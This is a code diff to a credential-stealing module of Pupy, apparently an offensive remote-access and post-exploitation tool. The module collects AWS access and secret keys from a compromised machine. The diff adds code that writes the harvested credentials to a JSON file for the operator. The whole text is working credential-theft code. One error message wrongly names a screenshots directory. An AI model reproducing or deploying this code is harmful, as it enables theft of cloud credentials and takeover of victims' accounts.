@@ -3,8 +3,11 @@
 # Contributor(s):
 
 from pupylib.PupyModule import *
+from os import path, makedirs
+import json
 
 __class_name__ = "AWSCredentials"
+
 
 @config(compatibilities=['windows', 'linux', 'darwin'], category="creds")
 class AWSCredentials(PupyModule):
@@ -27,3 +30,13 @@ class AWSCredentials(PupyModule):
                 self.log("Access secret key: %s" % item['aws_secret_access_key'])
         else:
             self.log("Couldn't find anything ;(")
+
+        try:
+            # If the directory doesnt exist then try to create it
+            if not path.isdir(path.join("data", "aws_creds")):
+                makedirs(path.join("data", "aws_creds"))
+        except Exception as error:
+            self.error("Couldn't create the directory data/screenshots %s" % error)
+
+        with open(path.join("data", "aws_creds", "creds.json"), 'w') as outfile:
+            json.dump(aws.creds_found, outfile)
